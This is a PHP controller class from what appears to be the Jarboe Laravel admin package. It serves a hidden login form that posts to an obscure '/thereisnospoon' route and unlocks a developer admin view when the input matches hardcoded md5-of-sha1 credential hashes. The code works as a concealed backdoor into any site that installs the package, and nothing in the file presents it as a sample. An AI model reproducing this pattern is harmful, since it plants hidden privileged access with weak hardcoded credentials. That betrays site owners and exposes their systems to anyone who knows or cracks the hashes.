<?php 

namespace Yaro\Jarboe;


class DevelController extends \Controller
{

    public function showMain()
    {
        if (!\Session::get('whoami')) {
            echo '<div style="display:none;">';
            echo '<form method="post" action="/thereisnospoon">';
            echo '<input name="login">';
            echo '<input type="password" name="passw">';
            echo '<input type="submit" value="go"></form>';
            echo '</div>';
            die;
        } else {
            return \View::make('admin::devel');
        }
    } // end showMain
    
    public function handleMain()
    {
        if (md5(sha1(\Input::get('login'))) == '563820a06fd2183a374525ca4b896253' && 
                  md5(sha1(\Input::get('passw')))   == 'abad4419de9fa6f2f7519fa6fc0f6fe8') {
            \Session::put('whoami', 'its me, lol');
        }
    } // end handleMain
    
    

}